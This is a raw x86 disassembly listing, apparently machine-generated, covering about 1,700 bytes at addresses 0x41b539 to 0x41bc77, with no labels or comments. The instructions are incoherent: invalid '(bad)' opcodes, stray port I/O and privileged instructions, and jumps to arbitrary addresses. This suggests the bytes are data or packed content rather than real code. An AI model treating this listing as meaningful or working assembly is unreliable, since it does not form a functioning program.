  41b539:	mov    edi,0x820b242
  41b53e:	pop    eax
  41b53f:	clc    
  41b540:	mov    dh,0x71
  41b542:	jmp    0x41b4fb
  41b544:	retf   
  41b545:	es mov eax,esi
  41b548:	mov    eax,DWORD PTR [ebx-0xd]
  41b54b:	hlt    
  41b54c:	call   0x4198e8ae
  41b551:	ficom  WORD PTR [ecx+0x4c1b46af]
  41b557:	out    0x4a,al
  41b559:	pushf  
  41b55a:	fimul  DWORD PTR [esi-0xfe5da9b]
  41b560:	pop    ebx
  41b561:	pop    esi
  41b562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b563:	jecxz  0x41b5aa
  41b565:	xchg   DWORD PTR [edi],ecx
  41b567:	sub    cl,ah
  41b569:	add    ah,BYTE PTR [esi+edi*8]
  41b56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b56d:	out    0x2c,eax
  41b56f:	popf   
  41b570:	aas    
  41b571:	sub    esi,esp
  41b573:	adc    DWORD PTR [eax-0x56],esp
  41b576:	mov    DWORD PTR [edi],ebp
  41b578:	fimul  WORD PTR [esi+0x29]
  41b57b:	in     al,0x30
  41b57d:	dec    DWORD PTR [edi]
  41b57f:	cwde   
  41b580:	pop    ebx
  41b581:	sbb    ebx,ebp
  41b583:	rcr    DWORD PTR [edi],1
  41b585:	or     BYTE PTR [ebx+0x780fefe0],ch
  41b58b:	pop    ss
  41b58c:	stos   BYTE PTR es:[edi],al
  41b58d:	sar    BYTE PTR fs:[eax+0x26],cl
  41b591:	cmp    eax,0xb34218d8
  41b596:	adc    esi,ebx
  41b598:	mov    bl,0x8
  41b59a:	dec    eax
  41b59b:	and    al,0x1b
  41b59d:	xchg   esp,eax
  41b59e:	adc    DWORD PTR ds:0xebb36045,ecx
  41b5a4:	imul   edx,DWORD PTR [ecx],0xd8a8bbea
  41b5aa:	div    bh
  41b5ac:	add    dl,dh
  41b5ae:	lock sahf 
  41b5b0:	dec    edx
  41b5b1:	mov    edx,0x9e72bb06
  41b5b6:	mov    ebp,0x5892d729
  41b5bb:	lea    edx,[edi+edx*1]
  41b5be:	shl    esp,1
  41b5c0:	shr    BYTE PTR [ebx-0x39ffbb3c],cl
  41b5c6:	dec    ebp
  41b5c7:	loopne 0x41b617
  41b5c9:	mov    bl,0xac
  41b5cb:	mov    esi,DWORD PTR gs:[edi]
  41b5ce:	xor    eax,0x26b18a81
  41b5d3:	lods   eax,DWORD PTR ds:[esi]
  41b5d4:	out    0x6b,al
  41b5d6:	and    edx,edx
  41b5d8:	xchg   esp,eax
  41b5d9:	fnstsw WORD PTR [esi]
  41b5db:	lods   al,BYTE PTR ds:[esi]
  41b5dc:	sub    bl,BYTE PTR [ecx]
  41b5de:	aad    0xa3
  41b5e0:	cld    
  41b5e1:	sbb    BYTE PTR [eax+edi*4],dl
  41b5e4:	mov    ch,0x3d
  41b5e6:	stos   BYTE PTR es:[edi],al
  41b5e7:	and    ebx,esi
  41b5e9:	cmp    al,0xe3
  41b5eb:	imul   bl
  41b5ed:	retf   
  41b5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ef:	push   eax
  41b5f0:	add    edi,DWORD PTR [ebp-0x77ce1bfe]
  41b5f6:	xor    edx,ebx
  41b5f8:	mov    al,ds:0x18305992
  41b5fd:	push   esi
  41b5fe:	stc    
  41b5ff:	iret   
  41b600:	jo     0x41b619
  41b602:	add    dl,BYTE PTR [eax+0x7f3bb61d]
  41b608:	icebp  
  41b609:	mov    edx,0x4aef7931
  41b60e:	mov    ah,0x43
  41b610:	lock cli 
  41b612:	xor    edx,edx
  41b614:	icebp  
  41b615:	dec    esi
  41b616:	jb     0x41b628
  41b618:	inc    ebx
  41b619:	in     al,dx
  41b61a:	jecxz  0x41b5e7
  41b61c:	std    
  41b61d:	xchg   ebx,eax
  41b61e:	retf   
  41b61f:	and    ecx,edx
  41b621:	cmp    al,0x2e
  41b623:	aas    
  41b624:	std    
  41b625:	icebp  
  41b626:	xchg   esi,eax
  41b627:	adc    ebx,DWORD PTR [ecx+eax*4+0x3ef9d461]
  41b62e:	mov    esp,DWORD PTR [ecx+0x41]
  41b631:	es and edi,edx
  41b634:	sbb    eax,0x51c10ce3
  41b639:	and    DWORD PTR [esi-0x5326c265],eax
  41b63f:	out    dx,eax
  41b640:	pusha  
  41b641:	push   0x97a1fede
  41b646:	xchg   ecx,eax
  41b647:	xchg   ecx,eax
  41b648:	cmp    al,0x5e
  41b64a:	jbe    0x41b649
  41b64c:	sahf   
  41b64d:	retf   0x39c5
  41b650:	call   0x3aa0:0xe66bb0d
  41b657:	cld    
  41b658:	aad    0xfe
  41b65a:	lods   eax,DWORD PTR ds:[esi]
  41b65b:	mov    dh,0xf0
  41b65d:	jp     0x41b69a
  41b65f:	inc    edi
  41b660:	inc    ebx
  41b661:	jno    0x41b695
  41b663:	frstor [edi-0x54ef4c47]
  41b669:	es in  eax,dx
  41b66b:	nop
  41b66c:	mov    dh,0x64
  41b66e:	jp     0x41b63a
  41b670:	jl     0x41b6ca
  41b672:	test   BYTE PTR [edx+0x4c1aa527],0xcc
  41b679:	mov    esi,ss
  41b67b:	sub    BYTE PTR [edi-0x61],ch
  41b67e:	daa    
  41b67f:	mov    ds:0x65199ae,eax
  41b684:	fbstp  TBYTE PTR [esi-0x5f9aacd6]
  41b68a:	cmc    
  41b68b:	cmp    BYTE PTR [ebp+0x4cda9985],0x67
  41b692:	std    
  41b693:	inc    edi
  41b694:	cmp    esp,esp
  41b696:	mov    esp,0x14899723
  41b69b:	daa    
  41b69c:	gs hlt 
  41b69e:	rol    DWORD PTR [ecx+0xbb2ceb4],cl
  41b6a4:	inc    edi
  41b6a5:	xchg   edx,eax
  41b6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a7:	out    0x6b,eax
  41b6a9:	sbb    ebx,DWORD PTR [ebp+edi*2-0x7df0d001]
  41b6b0:	jle    0x41b724
  41b6b2:	add    BYTE PTR [eax],al
  41b6b4:	mov    edx,DWORD PTR [ebp-0x28]
  41b6b7:	mov    edi,DWORD PTR [ebp-0x4]
  41b6ba:	jmp    0x41bbcc
  41b6bf:	into   
  41b6c0:	iret   
  41b6c1:	iret   
  41b6c2:	cmp    al,0xcd
  41b6c4:	cmp    al,0xd1
  41b6c6:	shl    edi,1
  41b6c8:	aad    0x3b
  41b6ca:	je     0x41b686
  41b6cc:	inc    eax
  41b6cd:	cmc    
  41b6ce:	inc    edx
  41b6cf:	inc    eax
  41b6d0:	mov    WORD PTR [edi+0x78],?
  41b6d3:	jae    0x41b751
  41b6d5:	js     0x41b74f
  41b6d7:	test   BYTE PTR [esi-0x4e3b74ad],bh
  41b6dd:	cdq    
  41b6de:	mov    bl,0x44
  41b6e0:	mov    esp,0x54e5ff73
  41b6e5:	into   
  41b6e6:	adc    ebx,DWORD PTR [esi-0x7b]
  41b6e9:	aad    0x8b
  41b6eb:	adc    DWORD PTR ds:0x69cca947,ebp
  41b6f1:	push   edi
  41b6f2:	inc    edi
  41b6f3:	in     al,dx
  41b6f4:	dec    ebp
  41b6f5:	pop    edi
  41b6f6:	push   eax
  41b6f7:	inc    edx
  41b6f8:	aaa    
  41b6f9:	lods   eax,DWORD PTR ds:[esi]
  41b6fa:	in     al,dx
  41b6fb:	cdq    
  41b6fc:	adc    ecx,DWORD PTR [ecx+0x274fa1e6]
  41b702:	push   esi
  41b703:	pop    esp
  41b704:	test   al,0xea
  41b706:	gs inc ebp
  41b708:	sub    BYTE PTR [edx-0x402d998],0x1c
  41b70f:	sti    
  41b710:	adc    BYTE PTR [eax+0x44],0x18
  41b714:	in     al,0x4a
  41b716:	inc    esi
  41b717:	loopne 0x41b6a1
  41b719:	mov    ?,WORD PTR [ecx]
  41b71b:	ret    0x5ca1
  41b71e:	rcr    DWORD PTR [ebp+0x33dcc5ea],cl
  41b724:	or     eax,0xc4416383
  41b729:	jl     0x41b76b
  41b72b:	cdq    
  41b72c:	sti    
  41b72d:	push   ecx
  41b72e:	inc    ecx
  41b72f:	shl    BYTE PTR [ecx],cl
  41b731:	hlt    
  41b732:	jge    0x41b6df
  41b734:	rcl    edx,cl
  41b736:	xor    BYTE PTR [esi+0x6b],cl
  41b739:	stos   BYTE PTR es:[edi],al
  41b73a:	lock cmp BYTE PTR [ecx-0x12adc553],cl
  41b741:	xchg   ebx,eax
  41b742:	mov    esp,0x41e5792
  41b747:	cmp    al,0x2d
  41b749:	retf   0xa44a
  41b74c:	ss pop es
  41b74e:	and    al,0x79
  41b750:	cmp    al,0x5c
  41b752:	ins    DWORD PTR es:[edi],dx
  41b753:	les    ecx,FWORD PTR ds:[ebx+0x52]
  41b757:	fs xchg esp,eax
  41b759:	fcomp  DWORD PTR [edx+eiz*4-0x2609783a]
  41b760:	and    al,BYTE PTR [ecx]
  41b762:	fiadd  DWORD PTR [ebp-0x4e]
  41b765:	mov    eax,0x8ddf073f
  41b76a:	xor    al,0x47
  41b76c:	scas   eax,DWORD PTR es:[edi]
  41b76d:	mov    al,ds:0xa70e9d19
  41b772:	dec    edi
  41b773:	mov    ah,0xc6
  41b775:	ins    DWORD PTR es:[edi],dx
  41b776:	inc    edi
  41b777:	add    dh,BYTE PTR [ecx-0x3c69494b]
  41b77d:	cmp    bl,BYTE PTR [edi+0x18aaed43]
  41b783:	jns    0x41b728
  41b785:	add    BYTE PTR [eax],al
  41b787:	cli    
  41b788:	daa    
  41b789:	xchg   esi,eax
  41b78a:	addr16 sti 
  41b78c:	lea    esp,[ecx+0x7d]
  41b78f:	fdivrp st(4),st
  41b791:	jge    0x41b7f7
  41b793:	jne    0x41b7d4
  41b795:	xchg   edx,eax
  41b796:	fwait
  41b797:	sahf   
  41b798:	lock test DWORD PTR [esi],eax
  41b79b:	sbb    BYTE PTR [bp+si+0x38b3],bl
  41b7a0:	hlt    
  41b7a1:	test   DWORD PTR [eax-0x79],esp
  41b7a4:	je     0x41b747
  41b7a6:	outs   dx,DWORD PTR ds:[esi]
  41b7a7:	or     esp,DWORD PTR cs:[ebp-0xc]
  41b7ab:	pop    ecx
  41b7ac:	loopne 0x41b787
  41b7ae:	xchg   esi,eax
  41b7af:	inc    edi
  41b7b0:	ds leave 
  41b7b2:	fucomip st,st(2)
  41b7b4:	sub    ah,BYTE PTR [ebp-0x15]
  41b7b7:	cmp    bl,bl
  41b7b9:	sbb    dl,BYTE PTR [esi]
  41b7bb:	ret    
  41b7bc:	dec    ecx
  41b7bd:	mov    eax,0x281544c4
  41b7c2:	xchg   ebp,eax
  41b7c3:	ja     0x41b79a
  41b7c5:	fcomp  QWORD PTR [ebp-0x8]
  41b7c8:	es pusha 
  41b7ca:	lods   al,BYTE PTR ds:[esi]
  41b7cb:	pop    edx
  41b7cc:	sbb    BYTE PTR [edx-0x48],cl
  41b7cf:	sub    eax,0x1cb785d9
  41b7d4:	sar    bh,1
  41b7d6:	(bad)  
  41b7d7:	(bad)  
  41b7d9:	xchg   edi,eax
  41b7da:	mov    esp,0xc20011e6
  41b7df:	push   edi
  41b7e0:	sub    al,0x91
  41b7e2:	jns    0x41b84e
  41b7e4:	inc    ebx
  41b7e5:	ss jle 0x41b7d9
  41b7e8:	jmp    0x41b7c8
  41b7ea:	push   ebx
  41b7eb:	cmp    ebx,DWORD PTR [ecx-0x6]
  41b7ee:	dec    esp
  41b7ef:	sub    BYTE PTR ds:0x163db134,ch
  41b7f5:	sbb    dh,BYTE PTR [eax]
  41b7f7:	pusha  
  41b7f8:	push   edi
  41b7f9:	push   ebp
  41b7fa:	mov    gs,WORD PTR [ebx-0x57]
  41b7fd:	imul   ebp,eax,0x8c3f6279
  41b803:	fbstp  TBYTE PTR [ebx+eax*8-0x6f]
  41b807:	and    bh,BYTE PTR [edx-0x49a2eaa7]
  41b80d:	xchg   ebp,eax
  41b80e:	mov    ebp,0xedee2d4a
  41b813:	and    ebp,DWORD PTR [edi*2-0x6b4b3baf]
  41b81a:	loopne 0x41b80f
  41b81c:	dec    edx
  41b81d:	stos   DWORD PTR es:[edi],eax
  41b81e:	xchg   eax,ebp
  41b820:	xchg   ecx,eax
  41b821:	or     al,0x4f
  41b823:	xor    DWORD PTR [ecx-0x2],edi
  41b826:	aas    
  41b827:	dec    esp
  41b828:	iret   
  41b829:	pop    esp
  41b82a:	enter  0xd494,0xf5
  41b82e:	mov    cl,0x60
  41b830:	jmp    0xb6e14e8b
  41b835:	bound  edi,QWORD PTR fs:[eax+0x5aaf3fc5]
  41b83c:	pop    eax
  41b83d:	cwde   
  41b83e:	push   cs
  41b83f:	sub    al,0x8c
  41b841:	sbb    edi,esp
  41b843:	adc    eax,0xedbc906
  41b848:	xchg   ebx,ebx
  41b84a:	das    
  41b84b:	pop    ds
  41b84c:	inc    eax
  41b84d:	xchg   ebp,eax
  41b84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b84f:	jp     0x41b854
  41b851:	adc    al,0xe6
  41b853:	xchg   ebx,eax
  41b854:	std    
  41b855:	gs (bad) 
  41b857:	hlt    
  41b858:	shl    edi,0x7f
  41b85b:	fs jg  0x41b801
  41b85e:	pop    edx
  41b85f:	sub    DWORD PTR [eax],edx
  41b861:	jbe    0x41b84f
  41b863:	rol    BYTE PTR [edi+0x6cc1abec],0x2a
  41b86a:	jmp    0x41b86d
  41b86c:	fistp  QWORD PTR [edx-0x3e]
  41b86f:	sahf   
  41b870:	dec    ecx
  41b871:	sub    bh,BYTE PTR fs:[esi+0x60]
  41b875:	xchg   ecx,eax
  41b876:	xchg   esi,eax
  41b877:	mov    cl,0xf0
  41b879:	add    dh,ch
  41b87b:	imul   ebx,DWORD PTR ds:0xeb9cc594,0xe8077360
  41b885:	enter  0xa281,0x9e
  41b889:	sbb    BYTE PTR [ecx],bl
  41b88b:	pop    edi
  41b88c:	loopne 0x41b904
  41b88e:	jno    0x41b8ab
  41b890:	icebp  
  41b891:	jg     0x41b8f1
  41b893:	pusha  
  41b894:	mov    cs,WORD PTR ds:0x584208b8
  41b89a:	pop    ds
  41b89b:	das    
  41b89c:	cwde   
  41b89d:	aas    
  41b89e:	or     ecx,ebx
  41b8a0:	push   es
  41b8a1:	inc    ecx
  41b8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a3:	out    dx,al
  41b8a4:	adc    eax,edi
  41b8a6:	xchg   ebx,eax
  41b8a7:	cli    
  41b8a8:	xchg   DWORD PTR [ebx+0x73],ebx
  41b8ab:	mov    esp,0xb7586451
  41b8b0:	std    
  41b8b1:	mov    esi,0x2d210b36
  41b8b6:	cs lock mov bl,0x74
  41b8ba:	nop
  41b8bb:	nop
  41b8bc:	add    eax,0x6e5b2d2b
  41b8c1:	iret   
  41b8c2:	cwde   
  41b8c3:	sar    DWORD PTR [ebx],1
  41b8c5:	mov    dh,0xa4
  41b8c7:	jns    0x41b8bb
  41b8c9:	fucomp st(0)
  41b8cb:	(bad)  
  41b8cc:	push   esp
  41b8cd:	mov    edx,0x4abd6c4c
  41b8d2:	inc    eax
  41b8d3:	jo     0x41b858
  41b8d5:	inc    ebp
  41b8d6:	mov    dl,0x84
  41b8d8:	push   edx
  41b8d9:	sbb    eax,0x5f126623
  41b8de:	cmc    
  41b8df:	push   0xffffff9c
  41b8e1:	or     DWORD PTR [edx-0x6564963a],ebp
  41b8e7:	push   es
  41b8e8:	xor    al,BYTE PTR [ebp-0x70e18148]
  41b8ee:	outs   dx,DWORD PTR ds:[esi]
  41b8ef:	out    0xcd,al
  41b8f1:	push   esp
  41b8f2:	cmc    
  41b8f3:	push   edi
  41b8f4:	cmp    esi,DWORD PTR [edx-0xd98fbb5]
  41b8fa:	popf   
  41b8fb:	jae    0x41b8d7
  41b8fd:	lods   eax,DWORD PTR ds:[esi]
  41b8fe:	aaa    
  41b8ff:	inc    eax
  41b900:	(bad)  
  41b901:	pop    edx
  41b902:	out    0x5f,al
  41b904:	jp     0x41b8c3
  41b906:	xor    al,0xc9
  41b908:	jmp    0x32f4:0xbc611aff
  41b90f:	sub    eax,0x81eb68db
  41b914:	xchg   edx,eax
  41b915:	icebp  
  41b916:	sbb    al,0x92
  41b918:	mov    DWORD PTR es:[esi+eax*8-0x59d64109],eax
  41b920:	push   edi
  41b921:	mov    WORD PTR [edi+ebp*8-0x48cbefa6],ss
  41b928:	outs   dx,BYTE PTR ds:[esi]
  41b929:	pop    esi
  41b92a:	xchg   esi,eax
  41b92b:	fistp  WORD PTR [edx-0xc]
  41b92e:	pop    esp
  41b92f:	sbb    ah,BYTE PTR [ecx+esi*8]
  41b932:	sub    esp,DWORD PTR [ebx-0x3e]
  41b935:	ja     0x41b9a1
  41b937:	jno    0x41b99d
  41b939:	stos   DWORD PTR es:[edi],eax
  41b93a:	outs   dx,BYTE PTR ds:[esi]
  41b93b:	xor    esp,DWORD PTR [ecx+0x40]
  41b93e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b93f:	sbb    esp,edi
  41b941:	mov    BYTE PTR [ecx+0x5],dh
  41b944:	in     eax,dx
  41b945:	push   ebx
  41b946:	out    0x5c,al
  41b948:	push   cs
  41b949:	les    ebx,FWORD PTR [ebp+0x26]
  41b94c:	outs   dx,DWORD PTR ds:[esi]
  41b94d:	add    ecx,esi
  41b94f:	dec    edi
  41b950:	clc    
  41b951:	jmp    0xeea9:0xd5b65e80
  41b958:	iret   
  41b959:	jge    0x41b957
  41b95b:	mov    dl,0x90
  41b95d:	pop    ds
  41b95e:	mov    dl,0x10
  41b960:	push   0x53
  41b962:	mov    al,0x95
  41b964:	je     0x41b962
  41b966:	hlt    
  41b967:	dec    esp
  41b968:	icebp  
  41b969:	nop
  41b96a:	mov    ecx,0xca27000e
  41b96f:	mov    ch,BYTE PTR [eax]
  41b971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b972:	jmp    0x41b9de
  41b974:	les    ebx,FWORD PTR [ebx+0xe454e08]
  41b97a:	and    BYTE PTR [esi+0x11],ah
  41b97d:	mov    ch,0x3
  41b97f:	inc    edx
  41b980:	int3   
  41b981:	std    
  41b982:	shl    edi,0x21
  41b985:	jle    0x41ba04
  41b987:	in     eax,0x72
  41b989:	clc    
  41b98a:	sbb    cl,ah
  41b98c:	sbb    BYTE PTR [ebx],ah
  41b98e:	(bad)  
  41b990:	(bad)  
  41b991:	(bad)  
  41b992:	arpl   ax,si
  41b994:	sub    eax,ebp
  41b996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b997:	or     eax,0xf4397cb8
  41b99c:	repnz mov eax,0x9b857cd1
  41b9a2:	push   edi
  41b9a3:	cmp    bh,BYTE PTR [edx+0x43]
  41b9a6:	adc    bh,BYTE PTR [edx-0x71167ba7]
  41b9ac:	jno    0x41b9d7
  41b9ae:	inc    esi
  41b9af:	addr16 jle 0x41b962
  41b9b2:	inc    ebp
  41b9b3:	test   dh,0x1e
  41b9b6:	sub    ecx,DWORD PTR [edi-0x78]
  41b9b9:	sbb    eax,0x8d48f638
  41b9be:	dec    ebp
  41b9bf:	bound  edx,QWORD PTR [esi]
  41b9c1:	cmp    DWORD PTR [ebx],ecx
  41b9c3:	imul   ebx,DWORD PTR [esi+0x7f],0xffffff8c
  41b9c7:	and    al,0xfd
  41b9c9:	dec    ecx
  41b9ca:	mov    ebp,0xc23f574b
  41b9cf:	pop    edx
  41b9d0:	sbb    ebx,DWORD PTR [ebx-0x38cd2f1b]
  41b9d6:	pushf  
  41b9d7:	repz (bad) [eax]
  41b9da:	cmp    BYTE PTR [edx+0x721b1d1a],dh
  41b9e0:	scas   al,BYTE PTR es:[edi]
  41b9e1:	pop    ebx
  41b9e2:	lods   eax,DWORD PTR ds:[esi]
  41b9e3:	and    ebx,ebx
  41b9e5:	pop    esi
  41b9e6:	sti    
  41b9e7:	cmp    edx,edx
  41b9e9:	adc    ebp,DWORD PTR [edi+0x48ee9a16]
  41b9ef:	sub    eax,0x50f2bff
  41b9f4:	xor    al,0x4e
  41b9f6:	pop    ecx
  41b9f7:	add    ecx,DWORD PTR [edx*8+0x44f4b908]
  41b9fe:	mov    eax,0xa4cb6360
  41ba03:	retf   
  41ba04:	test   DWORD PTR [ecx-0x42],esi
  41ba07:	push   edi
  41ba08:	pop    edx
  41ba09:	pop    esi
  41ba0a:	pop    esp
  41ba0b:	stos   BYTE PTR es:[edi],al
  41ba0c:	int3   
  41ba0d:	sahf   
  41ba0e:	push   DWORD PTR [edx-0x4c072484]
  41ba14:	inc    esi
  41ba15:	out    dx,eax
  41ba16:	cmc    
  41ba17:	dec    eax
  41ba18:	sub    BYTE PTR [ecx-0x484cb23c],dl
  41ba1e:	xchg   esi,ecx
  41ba20:	mov    ds:0x42bfb4a3,al
  41ba25:	clc    
  41ba26:	mov    al,ds:0x15185823
  41ba2b:	sub    DWORD PTR [ecx+0x12c26db0],ebx
  41ba31:	dec    ebp
  41ba32:	dec    edx
  41ba33:	(bad)  [edi]
  41ba35:	int3   
  41ba36:	les    eax,FWORD PTR [eax-0x69446ec5]
  41ba3c:	scas   eax,DWORD PTR es:[edi]
  41ba3d:	retf   0x32b3
  41ba40:	jge    0x41babd
  41ba42:	cmp    ebp,DWORD PTR [ebp-0x35]
  41ba45:	dec    ebx
  41ba46:	adc    bl,bh
  41ba48:	push   ds
  41ba49:	(bad)  
  41ba4a:	out    0x2c,al
  41ba4c:	push   es
  41ba4d:	push   es
  41ba4e:	out    dx,eax
  41ba4f:	pop    ss
  41ba50:	cmc    
  41ba51:	jecxz  0x41bab7
  41ba53:	pop    edx
  41ba54:	mov    ch,0x50
  41ba56:	adc    al,0xb9
  41ba58:	nop
  41ba59:	xor    cl,BYTE PTR [eax]
  41ba5b:	int    0x82
  41ba5d:	mov    edi,0x144a1658
  41ba62:	sub    ch,BYTE PTR [esi+eax*8+0x73419c7e]
  41ba69:	mov    ebp,0x7d1d1555
  41ba6e:	dec    ecx
  41ba6f:	sbb    BYTE PTR [edi-0x1d],ch
  41ba72:	pop    es
  41ba73:	mov    WORD PTR [edi+0xe],?
  41ba76:	loope  0x41baa0
  41ba78:	ins    BYTE PTR es:[edi],dx
  41ba79:	mov    ebx,0xb9f68a97
  41ba7e:	add    eax,0xfa60b1d4
  41ba83:	jb     0x41ba53
  41ba85:	cld    
  41ba86:	add    BYTE PTR ds:0x991a62b5,bh
  41ba8c:	jp     0x41ba4a
  41ba8e:	mov    ebp,fs
  41ba90:	sbb    BYTE PTR [ebp+0x24],ah
  41ba93:	or     dl,BYTE PTR [ebx]
  41ba95:	leave  
  41ba96:	lods   al,BYTE PTR ds:[esi]
  41ba97:	push   edi
  41ba98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba99:	fbld   TBYTE PTR [eax-0x63bc2de7]
  41ba9f:	cmp    BYTE PTR ds:0xe12a54f4,cl
  41baa5:	sub    DWORD PTR [esi+0x45f87ea0],0x7d
  41baac:	add    DWORD PTR [esi],esp
  41baae:	jmp    0x902b875d
  41bab3:	addr16 (bad) 
  41bab6:	mov    dh,0x7d
  41bab8:	xchg   ecx,eax
  41bab9:	push   esi
  41baba:	fwait
  41babb:	jl     0x41ba7f
  41babd:	pusha  
  41babe:	leave  
  41babf:	dec    esp
  41bac0:	leave  
  41bac1:	xlat   BYTE PTR ds:[ebx]
  41bac2:	jb     0x41bab9
  41bac4:	mov    dh,0x35
  41bac6:	gs pop edi
  41bac8:	neg    BYTE PTR [esi-0x1df25152]
  41bace:	test   DWORD PTR [ebx-0x64],ecx
  41bad1:	rcl    bh,1
  41bad3:	fbstp  TBYTE PTR [eax-0x7b50b163]
  41bad9:	je     0x41bae3
  41badb:	(bad)  
  41badc:	add    ebx,eax
  41bade:	jmp    0xe5ac44cd
  41bae3:	fistp  QWORD PTR [ebx]
  41bae5:	xchg   DWORD PTR [edi-0x2e216fe2],esi
  41baeb:	sbb    al,0xa1
  41baed:	push   0x50527792
  41baf2:	sahf   
  41baf3:	xor    eax,DWORD PTR [eax-0x23]
  41baf6:	adc    DWORD PTR [eax+0x2b],0x26
  41bafa:	jns    0x41bafa
  41bafc:	sub    al,0x74
  41bafe:	push   edx
  41baff:	push   edx
  41bb00:	(bad)  [eax-0x76]
  41bb03:	xor    bh,dl
  41bb05:	hlt    
  41bb06:	pop    esp
  41bb07:	pusha  
  41bb08:	loope  0x41bab7
  41bb0a:	pop    ecx
  41bb0b:	in     al,0x19
  41bb0d:	jns    0x41ba95
  41bb0f:	(bad)  
  41bb11:	mov    ebp,DWORD PTR [edi-0x21]
  41bb14:	xchg   ecx,eax
  41bb15:	rcr    DWORD PTR [ebx-0x26e009e4],0x45
  41bb1c:	std    
  41bb1d:	jmp    0x41bb6f
  41bb1f:	cmp    ecx,esi
  41bb21:	aas    
  41bb22:	scas   al,BYTE PTR es:[edi]
  41bb23:	retf   0x26b9
  41bb26:	popf   
  41bb27:	sahf   
  41bb28:	icebp  
  41bb29:	add    DWORD PTR [edx],esp
  41bb2b:	jo     0x41bac4
  41bb2d:	repnz xor eax,0x145cd383
  41bb33:	lods   al,BYTE PTR ds:[esi]
  41bb34:	pop    esp
  41bb35:	mov    eax,0x804d259
  41bb3a:	sub    eax,0xb04a82ed
  41bb3f:	pop    esp
  41bb40:	imul   esp,DWORD PTR [ebx],0xc2298208
  41bb46:	(bad)  
  41bb47:	imul   ebx,DWORD PTR [esi+0x1d07eff7],0x7f0e9f4
  41bb51:	and    cl,BYTE PTR [edx]
  41bb53:	leave  
  41bb54:	jmp    0x5ccea9a3
  41bb59:	xor    eax,0x1b95ad33
  41bb5e:	mov    ch,0xf8
  41bb60:	daa    
  41bb61:	lods   eax,DWORD PTR ds:[esi]
  41bb62:	push   0x951928d5
  41bb67:	mov    ah,0x57
  41bb69:	or     BYTE PTR [ebp+0x7cf17d7e],dh
  41bb6f:	jmp    0x61325baa
  41bb74:	mov    ah,0x31
  41bb76:	rol    BYTE PTR [ecx],cl
  41bb78:	xor    dh,BYTE PTR [esp+edx*2]
  41bb7b:	mov    bl,0xb4
  41bb7d:	hlt    
  41bb7e:	pop    ds
  41bb7f:	aad    0xb4
  41bb81:	addr16 sbb eax,0xcf44058b
  41bb87:	mov    al,0xdf
  41bb89:	out    dx,eax
  41bb8a:	push   es
  41bb8b:	add    al,dh
  41bb8d:	daa    
  41bb8e:	mov    edx,0x804f2d95
  41bb93:	sub    bh,dh
  41bb95:	jns    0x41bbad
  41bb97:	int3   
  41bb98:	dec    edx
  41bb99:	mov    eax,0x9aa1d8a6
  41bb9e:	aaa    
  41bb9f:	sub    esi,DWORD PTR [edi-0x1c133543]
  41bba5:	sbb    eax,0xe529131e
  41bbaa:	not    BYTE PTR [edx]
  41bbac:	out    dx,al
  41bbad:	adc    eax,0x59962703
  41bbb2:	in     al,dx
  41bbb3:	mov    al,ds:0x859b020f
  41bbb8:	pushf  
  41bbb9:	inc    edx
  41bbba:	dec    esi
  41bbbb:	jmp    0xc2c8:0xde2728d2
  41bbc2:	ss cdq 
  41bbc4:	xchg   WORD PTR [ebx],bp
  41bbc7:	cs mov bh,0x7c
  41bbca:	lods   eax,DWORD PTR ds:[esi]
  41bbcb:	adc    al,0x33
  41bbcd:	rol    BYTE PTR [ebx],1
  41bbcf:	sbb    eax,0x42a379
  41bbd4:	jmp    0x41c0e6
  41bbd9:	(bad)  
  41bbda:	ror    ebx,cl
  41bbdc:	cmp    al,0xdb
  41bbde:	aam    0xcb
  41bbe0:	fist   DWORD PTR [eax+0x2daecda1]
  41bbe6:	pop    ecx
  41bbe7:	mov    dh,0xea
  41bbe9:	mov    ebx,0x73787f97
  41bbee:	jl     0x41bc68
  41bbf0:	js     0x41bc03
  41bbf2:	pop    ebp
  41bbf3:	jl     0x41bbe7
  41bbf5:	loope  0x41bbf5
  41bbf7:	inc    edi
  41bbf8:	xor    edi,DWORD PTR [edi+eiz*1+0x1d24bf93]
  41bbff:	inc    ecx
  41bc00:	and    ebx,ebx
  41bc02:	scas   eax,DWORD PTR es:[edi]
  41bc03:	push   es
  41bc04:	cli    
  41bc05:	lds    esi,FWORD PTR [ebp-0x30daadff]
  41bc0b:	dec    BYTE PTR ds:0x50672cad
  41bc11:	fistp  WORD PTR [edx+0xba2ca0d]
  41bc17:	sti    
  41bc18:	in     eax,dx
  41bc19:	int3   
  41bc1a:	sbb    BYTE PTR [edx-0x364e48bd],bh
  41bc20:	jmp    0x50919e69
  41bc25:	scas   eax,DWORD PTR es:[edi]
  41bc26:	sbb    DWORD PTR [ebp+eax*4+0x47],ebp
  41bc2a:	imul   BYTE PTR ss:0x85fe1c0e
  41bc31:	jbe    0x41bbfb
  41bc33:	adc    bl,BYTE PTR [edi]
  41bc35:	js     0x41bcaf
  41bc37:	loope  0x41bc83
  41bc39:	cs sub eax,0xb439b3d8
  41bc3f:	push   esi
  41bc40:	jo     0x41bc78
  41bc42:	loope  0x41bcb1
  41bc44:	leave  
  41bc45:	out    dx,al
  41bc46:	fnstenv [edi]
  41bc48:	inc    ecx
  41bc49:	dec    esi
  41bc4a:	test   BYTE PTR [ecx+ebx*2-0x25e9f650],bh
  41bc51:	cs inc esi
  41bc53:	repz pop ebp
  41bc55:	ret    0xc593
  41bc58:	out    dx,eax
  41bc59:	ja     0x41bc96
  41bc5b:	pop    ds
  41bc5c:	xor    ebp,DWORD PTR ds:0x3869b3e0
  41bc62:	out    0xd2,eax
  41bc64:	out    dx,al
  41bc65:	and    BYTE PTR [ebx+0x75],ch
  41bc68:	mov    ch,0x86
  41bc6a:	mov    BYTE PTR [ecx-0x7f],al
  41bc6d:	xor    bh,BYTE PTR ds:0x9db3d36e
  41bc73:	xor    al,0x37
  41bc75:	mov    bl,0x16
  41bc77:	aam    0x2f
